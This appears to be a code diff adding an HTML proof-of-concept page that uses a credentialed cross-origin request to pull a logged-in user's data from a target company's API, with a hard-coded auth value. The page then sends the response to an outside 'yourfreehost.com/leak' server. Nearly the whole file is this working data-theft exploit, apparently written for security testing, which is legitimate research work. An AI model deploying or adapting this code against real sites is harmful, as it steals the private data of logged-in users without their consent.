@@ -1,1 +1,32 @@
-<h1>HACKED!!</h1>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test</title>
+    <script>
+        fetch("https://api.company-target.com/api/v3/ip.json", {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                src: "tag",
+                auth: "mHlqHytbs5xRhLbSvPSKl4PqNQJrYCYgov6cXimN"
+            })
+        })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Leaked Data:", data);
+                // Exfiltrate to attacker's server
+                fetch("https://yourfreehost.com/leak", {
+                    method: "POST",
+                    body: JSON.stringify(data),
+                    headers: { "Content-Type": "application/json" }
+                });
+            });
+    </script>
+</head>
+<body>
+    <h1>PoC Exploit</h1>
+</body>
+</html>
